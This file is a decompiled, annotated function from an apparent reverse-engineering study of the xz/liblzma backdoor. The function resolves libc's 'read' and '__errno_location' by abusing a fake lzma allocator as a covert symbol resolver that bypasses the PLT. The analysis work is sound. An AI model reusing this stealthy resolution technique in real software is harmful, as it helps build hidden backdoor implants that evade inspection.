// /home/kali/xzre-ghidra/xzregh/1045E0_resolve_libc_imports.c
// Function: resolve_libc_imports @ 0x1045E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall resolve_libc_imports(link_map * libc, elf_info_t * libc_info, libc_imports_t * imports)


/*
 * AutoDoc: Treats the runtime libc `link_map` as another ELF image: run `elf_parse`, point the fake allocator at `libc_info`, and resolve `read` plus `__errno_location` through the bootstrap trampolines. Only when both slots land does the helper declare `libc_imports_t` ready so later socket helpers can avoid touching libc’s PLT.
 */

#include "xzre_types.h"

BOOL resolve_libc_imports(link_map *libc,elf_info_t *libc_info,libc_imports_t *imports)

{
  BOOL success;
  lzma_allocator *allocator;
  pfn_read_t read_stub;
  pfn___errno_location_t errno_stub;
  
  allocator = get_lzma_allocator();
  // AutoDoc: Sanity-check the live libc mapping before we start allocating trampolines.
  success = elf_parse(*(Elf64_Ehdr **)libc,libc_info);
  if (success != FALSE) {
    allocator->opaque = libc_info;
    // AutoDoc: The fake allocator doubles as a symbol resolver, so each size constant maps to a libc import.
    read_stub = (pfn_read_t)lzma_alloc(0x308,allocator);
    imports->read = read_stub;
    if (read_stub != (pfn_read_t)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    errno_stub = (pfn___errno_location_t)lzma_alloc(0x878,allocator);
    imports->__errno_location = errno_stub;
    if (errno_stub != (pfn___errno_location_t)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    // AutoDoc: Only succeed once both `read` and `__errno_location` landed.
    success = (BOOL)(imports->resolved_imports_count == 2);
  }
  return success;
}

